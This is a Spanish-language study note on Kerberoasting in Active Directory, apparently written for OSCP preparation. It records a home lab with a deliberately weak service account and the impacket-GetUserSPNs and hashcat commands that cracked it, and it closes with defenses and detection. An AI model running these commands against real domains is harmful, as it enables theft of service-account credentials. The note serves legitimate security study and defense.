# Kerberoasting — crackear cuentas de servicio (SPN)

> **En una frase:** cualquier usuario del dominio puede pedir al KDC el **TGS** de una cuenta con **SPN**; ese ticket va cifrado con el **hash de la contraseña** de esa cuenta → te lo llevas y lo **crackeas OFFLINE**. Si la pass es débil, caes la cuenta sin tocar el DC.
> Relacionado: [[kerberos-kdc]] · [[ntlm]] · [[agdlp-y-bloodhound]] · [[montar-lab-ad]]

---

## El problema (dónde nace el fallo)
Los servicios (SQL, IIS, etc.) corren bajo una **cuenta de servicio**. Para que Kerberos sepa *quién es el dueño* de un servicio, esa cuenta lleva un **SPN** (ver abajo). El SPN es necesario — no es el fallo.

**El fallo real:** el TGS de ese servicio se cifra con el **hash de la pass de la cuenta dueña**, y el KDC lo entrega a **cualquier usuario autenticado** que lo pida (no comprueba permisos). Si un admin le puso una **pass débil** a la cuenta de servicio (y encima `PasswordNeverExpires`), ese ticket es un test de contraseña offline regalado.

## SPN — ¿qué es?
**Service Principal Name** = etiqueta que dice *"este servicio pertenece a esta cuenta"*. NO es un permiso, es **identidad**.
```
MSSQLSvc / dc01.nordwind.local : 1433   →  cuenta svc_sql
 clase      host (FQDN)          puerto      (dueño)
```
El KDC lo usa para saber **con qué llave (hash) cerrar el sobre** cuando alguien pide el ticket.

## La analogía — la taquilla y el sobre
```
setspn  = cartel en la taquilla: "esta taquilla la gestiona svc_sql"
cliente → recepción (KDC): "dame el pase para la taquilla SQL"
KDC     → mete el pase en un SOBRE cerrado con la LLAVE de svc_sql (su hash) → te lo da
atacante→ se lleva el sobre a casa y prueba millones de llaves (hashcat) hasta abrirlo
```
Recepción da el sobre **a cualquiera**. Si la llave de svc_sql es floja → sobre abierto en segundos.

## Por qué es tan peligroso (y examen-friendly)
| Propiedad | Por qué importa |
|---|---|
| **Sin privilegios** | Basta UN usuario cualquiera del dominio. No hace falta ser admin. |
| **Offline** | Pides el TGS, lo sacas, crackeas en Kali. El DC no se entera. |
| **Silencioso / sin lockout** | No hay login → la política de bloqueo no aplica. Millones de intentos sin un solo 4625. |
| **Botín alto** | Las cuentas de servicio suelen tener privilegios gordos (SQL admin, a veces grupos privilegiados). |

## Requisito del ataque
Solo son atacables las cuentas **con SPN**. Los equipos también tienen SPN pero su pass es aleatoria de 120+ chars (incrackeable) → el objetivo son las **cuentas de USUARIO con SPN** (las que pone un humano).

---

## Montaje del escenario en el lab (lo que planté en DC01)
> Fecha: 2026-10-17 · cuenta `svc_sql` · pass débil **a propósito**.

```powershell
# 1. Localizar la OU
Get-ADOrganizationalUnit -Filter * | Select Name,DistinguishedName
#   → OU=ServiceAccounts,OU=Nordwind,DC=nordwind,DC=local   (OU anidada!)

# 2. Crear la cuenta de servicio con pass débil
New-ADUser -Name "svc_sql" -SamAccountName "svc_sql" `
  -UserPrincipalName "svc_sql@nordwind.local" `
  -Path "OU=ServiceAccounts,OU=Nordwind,DC=nordwind,DC=local" `
  -AccountPassword (ConvertTo-SecureString "Summer2023!" -AsPlainText -Force) `
  -Enabled $true -PasswordNeverExpires $true `
  -Description "SQL svc (lab - pass debil a proposito)"

# 3. Registrar el SPN (esto la hace kerberoasteable)
setspn -A MSSQLSvc/dc01.nordwind.local:1433 svc_sql

# 4. Verificar
setspn -L svc_sql
#   → MSSQLSvc/dc01.nordwind.local:1433   ✅
```

---

## El ataque real (desde Kali) — ✅ EJECUTADO (2026-10-17)
> Requiere credenciales (las de piotr, obtenidas vía [[asrep-roasting]]). Ver [[impacket]].

```bash
impacket-GetUserSPNs nordwind.local/piotr.wisniewski:'Autumn2024!' \
  -dc-ip 192.168.10.10 -request -outputfile kerb.txt
```
**Salida:** listó `svc_sql` con su SPN `MSSQLSvc/dc01.nordwind.local:1433` y volcó
el hash a `kerb.txt`. (El mensaje `CCache file is not found. Skipping...` es benigno.)

```bash
hashcat -m 13100 kerb.txt seasons.txt --force       # → svc_sql : Summer2023!
```

### ¿Cómo sabe qué TGS pedir? (clave entendida)
No le doy una lista. Como estoy **autenticado**, la herramienta **pregunta al DC por
LDAP**: *"¿qué cuentas de usuario tienen el atributo `servicePrincipalName`?"* → el DC
responde `svc_sql` → y pide el TGS de cada SPN devuelto. El SPN vive en el directorio
(lo escribió `setspn`), por eso basta con consultarlo. **Por esto Kerberoasting necesita
credenciales y AS-REP no.** Filtra a cuentas de usuario (las de equipo tienen pass
aleatoria incrackeable).

- [x] GetUserSPNs → hash `$krb5tgs$23$*svc_sql$NORDWIND.LOCAL$...`
- [x] hashcat `-m 13100` → **`Summer2023!`**

**Modos hashcat:** `13100` = RC4 (lo normal) · `19600/19700` = AES (si el dominio fuerza AES, mucho más lento). No confundir con `18200` (AS-REP).

---

## Defensa (lo que diría en una entrevista)
1. **gMSA (Group Managed Service Accounts)** — la cura real. Windows genera y rota una pass de ~240 chars aleatorios cada 30 días. Incrackeable offline → mata el ataque de raíz.
2. **Pass larga y aleatoria** (25+) si no hay gMSA. El ataque sigue siendo posible pero el crackeo, inviable.
3. **Forzar AES** (`msDS-SupportedEncryptionTypes`) en vez de RC4 → sube el coste del crackeo.
4. **Monitorizar** Event ID **4769** (peticiones de TGS) con cifrado RC4 en ráfaga → firma de un kerberoasting en marcha.

## Dónde cae en el OSCP
Set de AD (40 pts): tras conseguir *unas* credenciales cualesquiera, `GetUserSPNs.py` es de los primeros pivotes. 100% manual, sin Metasploit. → [[agdlp-y-bloodhound]] para ver la ruta tras crackear la cuenta.

## Primo hermano (no confundir)
- **Kerberoasting** = cuenta con **SPN** · necesitas credenciales de un user del dominio.
- **AS-REP Roasting** = cuenta sin **preauth** · NO necesitas credenciales, solo el nombre de usuario. → nota aparte (Sabotaje #2).
